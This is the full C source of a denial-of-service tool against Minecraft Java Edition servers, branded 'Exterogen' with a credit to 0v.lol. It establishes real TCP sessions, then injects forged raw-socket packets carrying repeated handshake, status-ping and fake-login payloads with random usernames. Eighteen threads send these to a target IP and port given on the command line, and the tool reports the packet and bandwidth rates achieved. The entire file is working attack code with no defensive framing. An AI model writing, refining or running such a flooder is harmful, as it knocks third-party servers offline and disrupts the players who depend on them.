#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#define FLOOD_SESSIONS 6
#define STREAM_SESSIONS 12
#define TOTAL_SESSIONS (FLOOD_SESSIONS + STREAM_SESSIONS)
#define MAX_PAYLOAD 1460
#define STREAM_INTERVAL_US 2000

#define TCP_HDRLEN_MIN 20

#define TCP_OLEN_TIMESTAMP 12
#define TCP_HDRLEN_TS (TCP_HDRLEN_MIN + TCP_OLEN_TIMESTAMP)
#define DEFAULT_CONN_SNDBUF (4 * 1024 * 1024)
#define DEFAULT_CONN_RCVBUF (4 * 1024 * 1024)
#define DEFAULT_ADV_WINDOW 65535

static const uint32_t mc_status_protos[] = {
    762, 763, 764, 765, 766, 767, 768, 769
};

static int parse_arg_u32(const char *value, uint32_t *out, uint32_t min, uint32_t max) {
    char *end = NULL;
    unsigned long parsed;

    if (!value || *value == '\0')
        return -1;

    parsed = strtoul(value, &end, 10);
    if (end == NULL || *end != '\0' || parsed < min || parsed > max)
        return -1;

    *out = (uint32_t)parsed;
    return 0;
}

struct exterogen_config {
    char target_ip[32];
    uint16_t target_port;
    uint32_t duration;
    uint32_t target_addr;
    uint32_t local_addr;
    volatile sig_atomic_t running;
    uint32_t conn_sndbuf;
    uint32_t conn_rcvbuf;
    uint16_t adv_window;
    uint64_t total_packets;
    uint64_t total_bytes;
    pthread_mutex_t stats_mutex;
};

struct rng_state {
    uint32_t s[4];
};

struct session_data {
    uint32_t seq;
    uint32_t ack_seq;
    uint16_t sport;
    uint16_t dport;
    int raw_sock;
    int conn_sock;
    int session_id;
    int is_flood;
    struct rng_state rng;
    int use_ts;
    int tcp_send_hlen;
    uint32_t ts_local;
    uint32_t ts_peer;
    uint32_t mc_step;
    uint32_t mc_proto;
    uint8_t mc_route;
};

static struct exterogen_config config;

static void rng_init(struct rng_state *r, uint32_t seed) {
    r->s[0] = seed;
    r->s[1] = seed ^ 0xA3A3A3A3u;
    r->s[2] = seed ^ 0x5F3571C8u;
    r->s[3] = seed ^ 0x7FEDC0DEu;
}

static uint32_t rng_next(struct rng_state *r) {
    uint32_t t = r->s[0];
    t ^= t << 11;
    t ^= t >> 8;
    r->s[0] = r->s[1];
    r->s[1] = r->s[2];
    r->s[2] = r->s[3];
    r->s[3] ^= r->s[3] >> 19;
    r->s[3] ^= t;
    return r->s[3];
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    uint32_t sum = 0;
    for (; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += *(uint8_t *)addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

static uint16_t checksum_tcp(struct iphdr *iph, struct tcphdr *tcph,
                             uint16_t data_len, int len) {
    const uint16_t *buf = (const uint16_t *)tcph;
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *(uint8_t *)buf;
    sum += (iph->saddr >> 16) & 0xFFFF;
    sum += iph->saddr & 0xFFFF;
    sum += (iph->daddr >> 16) & 0xFFFF;
    sum += iph->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += data_len;
    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)~sum;
}

static uint32_t tcp_now_ts_ms(void) {
    struct timespec ts;

    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0)
        return (uint32_t)time(NULL) * 1000u;
    return (uint32_t)(ts.tv_sec * 1000u + (uint32_t)(ts.tv_nsec / 1000000));
}

static int tcp_opts_get_tsval(const struct tcphdr *tcph, int seg_len, uint32_t *tsval_out) {
    int hlen = (int)tcph->doff * 4;

    if (hlen < (int)sizeof(struct tcphdr) || seg_len < hlen)
        return 0;

    const unsigned char *p = (const unsigned char *)tcph + sizeof(struct tcphdr);
    int opt_len = hlen - (int)sizeof(struct tcphdr);
    int i = 0;

    while (i < opt_len) {
        unsigned char kind = p[i];

        if (kind == 0)
            break;
        if (kind == 1) {
            i++;
            continue;
        }
        if (i + 1 >= opt_len)
            break;
        unsigned char olen = p[i + 1];

        if (olen < 2 || i + olen > opt_len)
            break;
        if (kind == 8 && olen >= 10) {
            uint32_t raw;

            memcpy(&raw, p + i + 2, sizeof(raw));
            *tsval_out = ntohl(raw);
            return 1;
        }
        i += olen;
    }
    return 0;
}

static void tcp_put_ts_opts(void *opt_start, uint32_t tsval, uint32_t tsecr) {
    unsigned char *p = (unsigned char *)opt_start;

    p[0] = 1;
    p[1] = 1;
    p[2] = 8;
    p[3] = 10;
    {
        uint32_t be = htonl(tsval);
        memcpy(p + 4, &be, sizeof(be));
    }
    {
        uint32_t be = htonl(tsecr);
        memcpy(p + 8, &be, sizeof(be));
    }
}

static uint32_t get_local_ip(void) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return 0;
    struct sockaddr_in server, local;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("8.8.8.8");
    server.sin_port = htons(53);
    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        close(sock);
        return 0;
    }
    socklen_t len = sizeof(local);
    if (getsockname(sock, (struct sockaddr *)&local, &len) < 0) {
        close(sock);
        return 0;
    }
    close(sock);
    return local.sin_addr.s_addr;
}

static int clamp_payload_len(int len, int max_len) {
    if (max_len < 1) return 0;
    if (len < 1) return 1;
    if (len > max_len) return max_len;
    return len;
}

static void init_session_rng(struct session_data *sd, int session_id) {
    uint32_t seed = (uint32_t)time(NULL);
    seed ^= (uint32_t)session_id * 0x9e3779b9u;
    seed ^= ((uint32_t)getpid() << 16) ^ (uint32_t)clock();
    rng_init(&sd->rng, seed);
}

static int mc_buf_put_varint(uint8_t *d, int rem, int32_t v) {
    uint32_t u = (uint32_t)v;
    int n = 0;

    for (;;) {
        if (n >= rem)
            return -1;
        if ((u & ~0x7Fu) == 0) {
            d[n++] = (uint8_t)u;
            return n;
        }
        d[n++] = (uint8_t)((u & 0x7F) | 0x80);
        u >>= 7;
    }
}

static int mc_buf_put_string(uint8_t *d, int rem, const char *s) {
    size_t sl = strlen(s);

    if (sl > 32767)
        return -1;
    int n = mc_buf_put_varint(d, rem, (int32_t)sl);
    if (n < 0 || rem < n + (int)sl)
        return -1;
    memcpy(d + n, s, sl);
    return n + (int)sl;
}

static void mc_put_i64_be(uint8_t *p, int64_t v) {
    uint64_t u = (uint64_t)v;

    for (int i = 0; i < 8; i++)
        p[7 - i] = (uint8_t)((u >> (i * 8)) & 0xFF);
}

static int mc_frame_packet(uint8_t *out, int cap, int32_t packet_id, const uint8_t *body, int body_len) {
    uint8_t inner[1024];
    int o = 0;
    int x = mc_buf_put_varint(inner + o, (int)sizeof(inner) - o, packet_id);

    if (x < 0)
        return -1;
    o += x;
    if (body_len > 0 && body != NULL) {
        if (o + body_len > (int)sizeof(inner))
            return -1;
        memcpy(inner + o, body, (size_t)body_len);
        o += body_len;
    }
    x = mc_buf_put_varint(out, cap, o);
    if (x < 0 || x + o > cap)
        return -1;
    memcpy(out + x, inner, (size_t)o);
    return x + o;
}

static int mc_build_handshake_body(uint8_t *tmp, int cap, int32_t proto, const char *addr,
                                   uint16_t port_be_host, int32_t next_state) {
    int o = 0;
    int x;

    x = mc_buf_put_varint(tmp + o, cap - o, proto);
    if (x < 0)
        return -1;
    o += x;
    x = mc_buf_put_string(tmp + o, cap - o, addr);
    if (x < 0)
        return -1;
    o += x;
    if (o + 2 > cap)
        return -1;
    tmp[o++] = (uint8_t)((port_be_host >> 8) & 0xFF);
    tmp[o++] = (uint8_t)(port_be_host & 0xFF);
    x = mc_buf_put_varint(tmp + o, cap - o, next_state);
    if (x < 0)
        return -1;
    o += x;
    return o;
}

static int mc_build_login_start_body(uint8_t *tmp, int cap, const char *name, uint32_t proto) {
    int o = mc_buf_put_string(tmp, cap, name);

    if (o < 0)
        return -1;
    if (proto >= 759) {
        if (o + 1 > cap)
            return -1;
        tmp[o++] = 0;
    }
    return o;
}

static void mc_pick_username(struct rng_state *r, char *out, size_t outsz) {
    static const char alnum[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
    int len = 3 + (int)(rng_next(r) % 14);

    if (len > 16)
        len = 16;
    if ((size_t)len + 1 > outsz)
        len = (int)outsz - 1;
    for (int i = 0; i < len; i++)
        out[i] = alnum[rng_next(r) % (int)(sizeof(alnum) - 1)];
    out[len] = '\0';
}

static int gen_minecraft_protocol_payload(struct session_data *sd, char *buf, int max_len) {
    uint8_t *b = (uint8_t *)buf;
    uint8_t tmp[512];
    int total = 0;
    int n;
    int p;

    if (max_len < 8)
        return clamp_payload_len(1, max_len);

    if (sd->mc_route == 0) {
        if (sd->mc_step == 0) {
            n = mc_build_handshake_body(tmp, (int)sizeof(tmp), (int32_t)sd->mc_proto, config.target_ip,
                                        config.target_port, 1);
            if (n < 0)
                return 0;
            p = mc_frame_packet(b + total, max_len - total, 0, tmp, n);
            if (p < 0)
                return 0;
            total += p;
            p = mc_frame_packet(b + total, max_len - total, 0, NULL, 0);
            if (p < 0)
                return clamp_payload_len(total, max_len);
            total += p;
            sd->mc_step = 1;
        }
        for (;;) {
            int64_t pingv = (int64_t)((uint64_t)rng_next(&sd->rng) |
                                      ((uint64_t)rng_next(&sd->rng) << 32));
            uint8_t pl[8];

            mc_put_i64_be(pl, pingv);
            p = mc_frame_packet(b + total, max_len - total, 1, pl, 8);
            if (p < 0)
                break;
            total += p;
            if (total + 32 > max_len)
                break;
        }
        return total > 0 ? total : clamp_payload_len(1, max_len);
    }

    if (sd->mc_step == 0) {
        n = mc_build_handshake_body(tmp, (int)sizeof(tmp), (int32_t)sd->mc_proto, config.target_ip,
                                    config.target_port, 2);
        if (n < 0)
            return 0;
        p = mc_frame_packet(b + total, max_len - total, 0, tmp, n);
        if (p < 0)
            return 0;
        total += p;
        {
            char uname[20];

            mc_pick_username(&sd->rng, uname, sizeof(uname));
            n = mc_build_login_start_body(tmp, (int)sizeof(tmp), uname, sd->mc_proto);
        }
        if (n < 0)
            return clamp_payload_len(total, max_len);
        p = mc_frame_packet(b + total, max_len - total, 0, tmp, n);
        if (p < 0)
            return clamp_payload_len(total, max_len);
        total += p;
        sd->mc_step = 1;
        return total;
    }

    for (;;) {
        int64_t pingv = (int64_t)((uint64_t)rng_next(&sd->rng) |
                                  ((uint64_t)rng_next(&sd->rng) << 32));
        uint8_t pl[8];

        mc_put_i64_be(pl, pingv);
        p = mc_frame_packet(b + total, max_len - total, 1, pl, 8);
        if (p < 0)
            break;
        total += p;
        if (total + 32 > max_len)
            break;
    }
    return total > 0 ? total : clamp_payload_len(1, max_len);
}

static int do_handshake(struct session_data *sd) {
    int conn_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (conn_sock < 0) return -1;
    sd->conn_sock = conn_sock;
    if (fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK) < 0) {
        close(conn_sock);
        sd->conn_sock = -1;
        return -1;
    }

    int on = 1;
    if (setsockopt(conn_sock, IPPROTO_TCP, TCP_NODELAY, &on, sizeof(on)) < 0) {
        fprintf(stderr, "[Session %d] TCP_NODELAY failed: %s\n", sd->session_id, strerror(errno));
    }

    if (config.conn_sndbuf > 0) {
        int sndbuf = (int)config.conn_sndbuf;
        if (setsockopt(conn_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf)) < 0) {
            fprintf(stderr, "[Session %d] SO_SNDBUF(%u) failed: %s\n", sd->session_id, config.conn_sndbuf, strerror(errno));
        }
    }

    if (config.conn_rcvbuf > 0) {
        int rcvbuf = (int)config.conn_rcvbuf;
        if (setsockopt(conn_sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf)) < 0) {
            fprintf(stderr, "[Session %d] SO_RCVBUF(%u) failed: %s\n", sd->session_id, config.conn_rcvbuf, strerror(errno));
        }
    }

    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = config.target_addr;
    target_addr.sin_port = htons(config.target_port);
    int connect_rc = connect(conn_sock, (struct sockaddr *)&target_addr, sizeof(target_addr));
    if (connect_rc < 0) {
        if (errno != EINPROGRESS && errno != EWOULDBLOCK && errno != EINTR) {
            close(conn_sock);
            sd->conn_sock = -1;
            return -1;
        }
    }

    time_t start = time(NULL);
    int done = 0;
    uint16_t expected_sport = 0;
    struct sockaddr_in conn_addr;
    socklen_t conn_len = sizeof(conn_addr);

    if (getsockname(conn_sock, (struct sockaddr *)&conn_addr, &conn_len) == 0)
        expected_sport = conn_addr.sin_port;

    while (time(NULL) - start < 10 && config.running) {
        char recv_buf[256];
        struct iphdr *iph;
        struct tcphdr *tcph;
        int ip_hl;
        struct sockaddr_in recv_addr;
        socklen_t recv_len = sizeof(recv_addr);
        int ret = recvfrom(sd->raw_sock, recv_buf, sizeof(recv_buf), MSG_DONTWAIT,
                          (struct sockaddr *)&recv_addr, &recv_len);
        if (ret > (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)) &&
            recv_addr.sin_addr.s_addr == config.target_addr) {

            iph = (struct iphdr *)recv_buf;
            ip_hl = iph->ihl * 4;
            if (ip_hl >= (int)sizeof(struct iphdr) && iph->protocol == IPPROTO_TCP) {

                tcph = (struct tcphdr *)(recv_buf + ip_hl);
                int tcp_bytes = (int)tcph->doff * 4;

                if (ret >= ip_hl + tcp_bytes &&
                    tcph->source == htons(config.target_port) &&
                    (expected_sport == 0 || tcph->dest == expected_sport) &&
                    tcph->syn && tcph->ack) {

                    sd->seq = ntohl(tcph->ack_seq);
                    sd->ack_seq = ntohl(tcph->seq) + 1;
                    sd->sport = tcph->dest;
                    sd->dport = tcph->source;
                    sd->use_ts = 0;
                    if (tcp_opts_get_tsval(tcph, ret - ip_hl, &sd->ts_peer)) {
                        sd->use_ts = 1;
                        sd->ts_local = tcp_now_ts_ms();
                    }
                    done = 1;
                    break;
                }
            }
        }
        usleep(5000);
    }
    return done ? 0 : -1;
}

static void close_session_socket(struct session_data *sd) {
    if (sd->conn_sock >= 0) {
        close(sd->conn_sock);
        sd->conn_sock = -1;
    }
}

static void peer_sync_ts_from_raw(struct session_data *sd) {
    char buf[576];
    struct sockaddr_in ra;
    socklen_t rlen;

    if (!sd->use_ts)
        return;

    for (;;) {
        rlen = sizeof(ra);
        int ret = recvfrom(sd->raw_sock, buf, sizeof(buf), MSG_DONTWAIT,
                           (struct sockaddr *)&ra, &rlen);
        if (ret < 0) {
            if (errno == EINTR)
                continue;
            break;
        }
        if (ret < (int)(sizeof(struct iphdr) + sizeof(struct tcphdr)))
            continue;
        if (ra.sin_addr.s_addr != config.target_addr)
            continue;

        struct iphdr *iph = (struct iphdr *)buf;
        int ip_hl = iph->ihl * 4;

        if (ip_hl < (int)sizeof(struct iphdr) || iph->protocol != IPPROTO_TCP)
            continue;
        if (ret < ip_hl + (int)sizeof(struct tcphdr))
            continue;

        struct tcphdr *tcph = (struct tcphdr *)(buf + ip_hl);
        int tcp_seg = (int)tcph->doff * 4;

        if (ret < ip_hl + tcp_seg)
            continue;
        if (tcph->source != sd->dport || tcph->dest != sd->sport)
            continue;

        uint32_t tsval;

        if (tcp_opts_get_tsval(tcph, ret - ip_hl, &tsval))
            sd->ts_peer = tsval;
    }
}

static int send_packet(struct session_data *sd, struct sockaddr_in *target_addr,
                      char *packet, int pkt_size, int payload_len) {
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    int tcp_hlen = sd->tcp_send_hlen;
    int sent;

    iph->id = htons((uint16_t)(rng_next(&sd->rng) & 0xFFFF));
    tcph->seq = htonl(sd->seq);
    tcph->ack_seq = htonl(sd->ack_seq);
    sd->seq += (uint32_t)payload_len;

    if (sd->use_ts) {
        tcph->doff = (uint16_t)(tcp_hlen / 4);
        tcp_put_ts_opts((char *)tcph + sizeof(struct tcphdr), sd->ts_local, sd->ts_peer);
        sd->ts_local++;
    } else {
        tcph->doff = 5;
    }

    iph->tot_len = htons((uint16_t)pkt_size);
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
    tcph->check = 0;
    tcph->check = checksum_tcp(iph, tcph,
                               htons((uint16_t)(tcp_hlen + payload_len)),
                               tcp_hlen + payload_len);

    sent = sendto(sd->raw_sock, packet, (size_t)pkt_size, MSG_NOSIGNAL,
                 (struct sockaddr *)target_addr, sizeof(*target_addr));
    if (sent > 0) {
        pthread_mutex_lock(&config.stats_mutex);
        config.total_packets++;
        config.total_bytes += (uint64_t)sent;
        pthread_mutex_unlock(&config.stats_mutex);
        return sent;
    }

    return -1;
}

static void *session_thread(void *arg) {
    struct session_data *sd = (struct session_data *)arg;
    struct sockaddr_in target_addr;
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = config.target_addr;
    target_addr.sin_port = htons(config.target_port);
    init_session_rng(sd, sd->session_id);
    sd->conn_sock = -1;
    sd->mc_step = 0;
    sd->mc_route = (uint8_t)((rng_next(&sd->rng) % 5u) == 0u ? 1u : 0u);
    if (sd->mc_route == 0) {
        sd->mc_proto = mc_status_protos[rng_next(&sd->rng) %
            (uint32_t)(sizeof(mc_status_protos) / sizeof(mc_status_protos[0]))];
    } else {
        sd->mc_proto = 754;
    }

    sd->raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd->raw_sock < 0) {
        fprintf(stderr, "[Session %d] Raw socket failed\n", sd->session_id);
        return NULL;
    }
    int one = 1;
    if (setsockopt(sd->raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        close(sd->raw_sock);
        return NULL;
    }

    if (do_handshake(sd) < 0) {
        fprintf(stderr, "[Session %d] Handshake timeout\n", sd->session_id);
        close_session_socket(sd);
        close(sd->raw_sock);
        return NULL;
    }
    sd->tcp_send_hlen = sd->use_ts ? TCP_HDRLEN_TS : TCP_HDRLEN_MIN;
    printf("[Session %d] Established (seq=%u, ack=%u)%s proto=%u %s %s\n",
           sd->session_id, sd->seq, sd->ack_seq,
           sd->use_ts ? " ts=on" : "",
           (unsigned int)sd->mc_proto,
           sd->mc_route ? "[login]" : "[status]",
           sd->is_flood ? "[flood]" : "[stream]");

    int pkt_size = sizeof(struct iphdr) + TCP_HDRLEN_TS + MAX_PAYLOAD;
    char *packet = malloc((size_t)pkt_size);
    if (!packet) {
        close(sd->raw_sock);
        return NULL;
    }

    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *payload = packet + sizeof(struct iphdr) + sd->tcp_send_hlen;

    memset(iph, 0, sizeof(struct iphdr));
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->ttl = 64;
    iph->frag_off = htons(1 << 14);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = config.local_addr;
    iph->daddr = config.target_addr;

    memset(tcph, 0, sizeof(struct tcphdr));
    tcph->source = sd->sport;
    tcph->dest = sd->dport;
    tcph->doff = 5;
    tcph->window = htons(config.adv_window);
    tcph->ack = 1;
    tcph->psh = 1;

    time_t end_time = time(NULL) + config.duration;
    uint64_t local_pkts = 0;

    if (sd->is_flood) {
        while (config.running && time(NULL) < end_time) {
            peer_sync_ts_from_raw(sd);
            int plen = gen_minecraft_protocol_payload(sd, payload, MAX_PAYLOAD);
            int total = sizeof(struct iphdr) + sd->tcp_send_hlen + plen;
            if (send_packet(sd, &target_addr, packet, total, plen) > 0)
                local_pkts++;
        }
    } else {
        while (config.running && time(NULL) < end_time) {
            peer_sync_ts_from_raw(sd);
            int plen = gen_minecraft_protocol_payload(sd, payload, MAX_PAYLOAD);
            int total = sizeof(struct iphdr) + sd->tcp_send_hlen + plen;
            if (send_packet(sd, &target_addr, packet, total, plen) > 0)
                local_pkts++;
            usleep(STREAM_INTERVAL_US);
        }
    }

    printf("[Session %d] Done, pkts=%llu\n", sd->session_id, (unsigned long long)local_pkts);
    free(packet);
    close_session_socket(sd);
    close(sd->raw_sock);
    return NULL;
}

static void sigint_handler(int sig) {
    (void)sig;
    printf("\n[*] Stopping\n");
    config.running = 0;
}

static void usage(const char *prog) {
    printf("Exterogen Minecraft (Java wire) c0redev for 0v.lol\n");
    printf("Usage: sudo %s <target_ip> <port> <duration>\n\n", prog);
    printf("options:\n");
    printf("  --sndbuf <bytes>    socket SO_SNDBUF (default: %u)\n", DEFAULT_CONN_SNDBUF);
    printf("  --rcvbuf <bytes>    socket SO_RCVBUF (default: %u)\n", DEFAULT_CONN_RCVBUF);
    printf("  --window <0-65535>  advertised tcp window (default: %u)\n\n", DEFAULT_ADV_WINDOW);
}

static int start_attack_module(void) {
    signal(SIGINT, sigint_handler);
    signal(SIGTERM, sigint_handler);

    printf("\nExterogen MC - %d flood + %d stream sessions (minecraft java payloads)\n",
           FLOOD_SESSIONS, STREAM_SESSIONS);
    printf("target: %s:%d, duration: %u sec\n\n", config.target_ip, config.target_port, config.duration);
    printf("session sockets: sndbuf=%u, rcvbuf=%u, advertised window=%u\n\n",
           config.conn_sndbuf, config.conn_rcvbuf, config.adv_window);

    struct session_data sessions[TOTAL_SESSIONS];
    pthread_t threads[TOTAL_SESSIONS];

    int started = 0;
    for (int i = 0; i < TOTAL_SESSIONS; i++) {
        memset(&sessions[i], 0, sizeof(sessions[i]));
        sessions[i].session_id = i + 1;
        sessions[i].is_flood = (i < FLOOD_SESSIONS);
        if (pthread_create(&threads[i], NULL, session_thread, &sessions[i]) == 0)
            started++;
        else
            fprintf(stderr, "Error: Thread %d creation failed\n", i + 1);
        usleep(80000);
    }

    for (int i = 0; i < started; i++)
        pthread_join(threads[i], NULL);

    printf("\n[*] Done\n");
    printf("    Packets: %llu\n", (unsigned long long)config.total_packets);
    printf("    Bytes: %.2f MB\n", config.total_bytes / 1024.0 / 1024.0);
    if (config.duration > 0)
        printf("    PPS: %llu, BPS: %.2f Mbps\n",
               (unsigned long long)(config.total_packets / config.duration),
               (config.total_bytes * 8.0 / config.duration) / 1024.0 / 1024.0);
    pthread_mutex_destroy(&config.stats_mutex);
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 4) {
        usage(argv[0]);
        return 1;
    }
    if (geteuid() != 0) {
        fprintf(stderr, "Error: Must run as root\n");
        return 1;
    }

    memset(&config, 0, sizeof(config));
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);

    uint32_t parsed_port = 0;
    if (parse_arg_u32(argv[2], &parsed_port, 1, 65535) < 0) {
        fprintf(stderr, "Error: Invalid port\n");
        return 1;
    }
    config.target_port = (uint16_t)parsed_port;

    uint32_t parsed_duration = 0;
    if (parse_arg_u32(argv[3], &parsed_duration, 1, UINT32_MAX) < 0) {
        fprintf(stderr, "Error: Invalid duration\n");
        return 1;
    }
    config.duration = (uint32_t)parsed_duration;
    config.conn_sndbuf = DEFAULT_CONN_SNDBUF;
    config.conn_rcvbuf = DEFAULT_CONN_RCVBUF;
    config.adv_window = DEFAULT_ADV_WINDOW;

    for (int i = 4; i < argc; i++) {
        if (strcmp(argv[i], "--sndbuf") == 0 && i + 1 < argc) {
            uint32_t value = 0;
            if (parse_arg_u32(argv[++i], &value, 1, 1024UL * 1024UL * 1024UL) < 0) {
                fprintf(stderr, "Error: Invalid --sndbuf value\n");
                return 1;
            }
            config.conn_sndbuf = (uint32_t)value;
        } else if (strcmp(argv[i], "--sndbuf") == 0) {
            fprintf(stderr, "Error: Missing --sndbuf value\n");
            return 1;
        } else if (strcmp(argv[i], "--rcvbuf") == 0 && i + 1 < argc) {
            uint32_t value = 0;
            if (parse_arg_u32(argv[++i], &value, 1, 1024UL * 1024UL * 1024UL) < 0) {
                fprintf(stderr, "Error: Invalid --rcvbuf value\n");
                return 1;
            }
            config.conn_rcvbuf = (uint32_t)value;
        } else if (strcmp(argv[i], "--rcvbuf") == 0) {
            fprintf(stderr, "Error: Missing --rcvbuf value\n");
            return 1;
        } else if (strcmp(argv[i], "--window") == 0 && i + 1 < argc) {
            uint32_t value = 0;
            if (parse_arg_u32(argv[++i], &value, 0, UINT32_MAX) < 0 || value > 65535) {
                fprintf(stderr, "Error: Invalid --window value\n");
                return 1;
            }
            config.adv_window = (uint16_t)value;
        } else if (strcmp(argv[i], "--window") == 0) {
            fprintf(stderr, "Error: Missing --window value\n");
            return 1;
        } else {
            fprintf(stderr, "Error: Unknown argument %s\n", argv[i]);
            return 1;
        }
    }

    if (config.target_port == 0) {
        fprintf(stderr, "Error: Invalid port\n");
        return 1;
    }

    struct in_addr target;
    if (inet_pton(AF_INET, config.target_ip, &target) != 1) {
        fprintf(stderr, "Error: Invalid target IP\n");
        return 1;
    }
    config.target_addr = target.s_addr;
    config.running = 1;
    pthread_mutex_init(&config.stats_mutex, NULL);

    config.local_addr = get_local_ip();
    if (config.local_addr == 0) {
        fprintf(stderr, "Error: Failed to get local IP\n");
        return 1;
    }

    return start_attack_module();
}
